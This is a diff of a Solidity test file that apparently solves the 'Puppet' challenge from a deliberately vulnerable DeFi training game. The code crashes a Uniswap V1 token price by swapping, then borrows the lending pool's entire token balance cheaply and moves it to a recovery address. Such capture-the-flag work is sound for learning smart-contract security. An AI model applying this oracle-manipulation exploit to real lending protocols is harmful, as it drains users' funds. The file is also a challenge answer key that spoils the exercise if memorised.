@@ -91,8 +91,19 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {
-        ChallengeSolver solver = new ChallengeSolver(token, lendingPool, uniswapV1Exchange, recovery);
+    function test_puppetV1() public checkSolvedByPlayer {
+        // check how much ETH would be required to borrow lendingPool's total DVT balance
+        console.log(
+            "starting deposit required: ", lendingPool.calculateDepositRequired(token.balanceOf(address(lendingPool)))
+        );
+
+        // approve pool to transfer tokens
+        token.approve(address(uniswapV1Exchange), token.balanceOf(player));
+        // swap tokens to crash price
+        uniswapV1Exchange.tokenToEthSwapInput(token.balanceOf(player), 1, 1 hours);
+
+        // deploy challenge solver contract and fund with ETH to make other operations in one tx
+        ChallengeSolver solver = new ChallengeSolver{value: player.balance}(token, lendingPool, recovery);
     }
 
     // Utility function to calculate Uniswap prices
@@ -125,30 +136,31 @@ contract ChallengeSolver {
     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
     DamnValuableToken token;
     PuppetPool lendingPool;
-    IUniswapV1Exchange uniswapV1Exchange;
     address recovery;
+    address player;
 
-    constructor(
-        DamnValuableToken _token,
-        PuppetPool _lendingPool,
-        IUniswapV1Exchange _uniswapV1Exchange,
-        address _recovery
-    ) {
+    constructor(DamnValuableToken _token, PuppetPool _lendingPool, address _recovery) payable {
         token = _token;
         lendingPool = _lendingPool;
-        uniswapV1Exchange = _uniswapV1Exchange;
         recovery = _recovery;
+        player = msg.sender;
 
-        console.log(
-            "starting deposit required: ", lendingPool.calculateDepositRequired(token.balanceOf(address(lendingPool)))
-        );
-        changePrice();
         run();
     }
 
-    function run() public {}
+    function run() public {
+        // check ETH deposit required for borrow
+        uint256 depositRequired = lendingPool.calculateDepositRequired(token.balanceOf(address(lendingPool)));
+        // verify manipulation worked
+        console.log("deposit required after swap: ", depositRequired);
 
-    function changePrice() public {
-        uniswapV1Exchange.addLiquidity(PLAYER_INITIAL_TOKEN_BALANCE, 1000, 1 hours);
+        // borrow tokens at reduced rate
+        lendingPool.borrow{value: depositRequired}(token.balanceOf(address(lendingPool)), address(this));
+
+        // send tokens to recovery address
+        token.transfer(recovery, token.balanceOf(address(this)));
+        // return excess ETH to player (not necessary)
+        (bool success,) = player.call{value: address(this).balance}("");
+        success;
     }
 }
